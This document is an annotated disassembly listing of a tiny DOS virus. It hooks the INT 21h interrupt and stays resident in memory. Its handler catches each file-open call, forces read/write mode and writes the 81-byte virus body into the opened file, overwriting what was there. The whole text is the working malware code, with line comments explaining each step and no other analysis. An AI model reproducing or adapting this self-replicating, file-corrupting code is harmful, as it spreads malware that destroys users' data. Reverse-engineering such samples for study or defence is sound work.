                            VIRUS_START:                  ;XREF[1]:     0000:0135(*)
ram:0000:0100   b82135          MOV         AX,0x3521                               ;AH=35h: Get interrupt vector
ram:0000:0103   cd21            INT         0x21
ram:0000:0105   891e1f01        MOV         word ptr [INT21_ORIGINAL_VECTOR_OFS],BX
ram:0000:0109   8c062101        MOV         word ptr [INT21_ORIGINAL_VECTOR_SEG],ES
ram:0000:010d   b425            MOV         AH,0x25                                 ;Set interrupt vector
ram:0000:010f   ba1901          MOV         DX,INT21_HANDLER
ram:0000:0112   cd21            INT         0x21
ram:0000:0114   ba5101          MOV         DX,VIRUS_END                            ;Terminate and stay resident; DX=numb...
ram:0000:0117   cd27            INT         0x27
                            INT21_HANDLER:                ;XREF[1]:     0000:010f(*)
ram:0000:0119   80fc3d          CMP         AH,0x3d                                 ;Open file
ram:0000:011c   7405            JZ          LAB_0000_0123
                            OFF_0000_011e:                ;XREF[3,3]:   0000:0105(*),0000:0109(*),0000:0126(*),0000:0105(*),
                                                          ;             0000:0109(*),0000:0126(*)
ram:0000:011e   ea00000000      JMPF        LAB_0000_0000
                            LAB_0000_0123:                ;XREF[1]:     0000:011c(j)
ram:0000:0123   9c              PUSHF
ram:0000:0124   b002            MOV         AL,0x2                                  ;Open in R/W mode
ram:0000:0126   2eff1e1f01      CALLF       [INT21_ORIGINAL_VECTOR_OFS]             ;Returns file handle in AX
ram:0000:012b   60              PUSHA
ram:0000:012c   1e              PUSH        DS
ram:0000:012d   0e              PUSH        CS
ram:0000:012e   1f              POP         DS
ram:0000:012f   93              XCHG        AX,BX                                   ;Move the file handle to BX
ram:0000:0130   b440            MOV         AH,0x40                                 ;Write to file
ram:0000:0132   b95100          MOV         CX,0x51                                 ;Virus size
ram:0000:0135   ba0001          MOV         DX,VIRUS_START
ram:0000:0138   cd21            INT         0x21
ram:0000:013a   1f              POP         DS
ram:0000:013b   61              POPA
ram:0000:013c   ca0200          RETF        0x2                                     ;Same as IRET (Interrupt return)
ram:0000:013f   286329203...    ds          "(c) 1999 MBR Labs"
                            VIRUS_END:                    ;XREF[1]:     0000:0114(*)
ram:0000:0151   00              ??          00h